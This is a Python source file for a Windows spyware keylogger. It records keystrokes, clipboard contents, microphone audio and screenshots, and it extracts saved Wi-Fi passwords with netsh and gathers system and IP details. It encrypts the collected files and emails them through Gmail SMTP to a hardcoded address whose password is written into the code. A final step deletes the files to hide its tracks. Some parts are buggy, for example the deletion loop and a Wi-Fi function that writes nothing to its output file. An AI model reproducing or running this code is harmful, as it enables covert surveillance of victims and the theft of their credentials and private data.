# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information ="key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipinfo.txt"
audio_information = "audios.wav"
screenshot_info = "screenshot.png"
wifi_information = "wifi_info.txt"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipinfo.txt"

input_file = 'clipinfo.txt'
output_file = 'test.txt'


microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "thriftcity8@gmail.com"
password = "thriftcity5738"

username = getpass.getuser()

toaddr = "thriftcity8@gmail.com"

key = "rB7XXiVQLNDZBb--DRkzyUlDYmh6CDONvUwrHpHVJBU="

file_path ="C:\\Users\\Megha\\PycharmProjects\\pythontrial\\project"
extend ="\\"
file_merge = file_path + extend

#email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "FILE"
    body = " "
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.processor() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()
send_email(system_information, file_path + extend + system_information, toaddr)

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()
send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)

# get the microphone
def microphone():
    sf = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * sf), samplerate=sf, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, sf, myrecording)

microphone()
#send_email(audio_information, file_path + extend + audio_information, toaddr)

# get screenshots
def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_info)

screenshot()
send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)

def wifi():
    import subprocess

    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    data = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in data:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

            try:
                print("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                print("{:<30}|  {:<}".format(i, ""))
        except subprocess.CalledProcessError:
            print("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
        data = input("")

wifi()
send_email(wifi_information, file_path + extend + wifi_information, toaddr)

# get the encryption
def encrypt():

    with open(input_file, 'rb') as f:
        data = f.read()  # Read the bytes of the input file

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(output_file, 'wb') as f:
        f.write(encrypted)  # Write the encrypted bytes to the output file
encrypt()
send_email(output_file, file_path + extend + output_file, toaddr)

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []


    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space")>0:
                    f.write('\n')
                    f.close()

                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False

        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_merge = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

# Encrypt files
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_merge[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_merge[count], encrypted_file_merge[count], toaddr)
    count += 1

time.sleep(30)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_info, audio_information]
for file in delete_files:
    os.remove(file_merge)